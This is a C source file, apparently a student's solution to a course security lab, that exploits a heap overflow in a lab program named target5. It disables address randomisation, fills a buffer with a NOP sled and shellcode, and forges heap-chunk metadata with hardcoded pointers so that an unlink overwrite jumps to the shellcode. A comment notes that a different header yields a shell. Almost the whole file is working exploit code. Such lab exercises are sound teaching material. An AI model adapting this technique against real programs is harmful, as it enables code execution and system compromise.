#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/personality.h>

/* Change to shellcode.h if you want a shell */
#include "checkcode.h"
#define TARGET "../targets/target5"
#define BUFLEN 120

int main(void)
{
  /* Setup code to make sure your target runs without ASLR and has an
     executable stack. Don't change this.*/
  personality(ADDR_NO_RANDOMIZE |READ_IMPLIES_EXEC);

  char *args[3];
  char *env[1];

  char buf[BUFLEN*2] = {0};
  memset(buf, 0x90, BUFLEN*2-1);
  memcpy(buf+8, shellcode, sizeof(shellcode)-1);

  buf[4] = 0x01; // set free bit

  // set left and right pointers of b
  *(unsigned int *)(buf + BUFLEN + 4) = 0xffffdd40;
  *(unsigned int *)(buf + BUFLEN) = 0x804c068;

  // insert jump instruction to point to shellcode
  buf[0] = 0xeb;
  buf[1] = 0x06;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
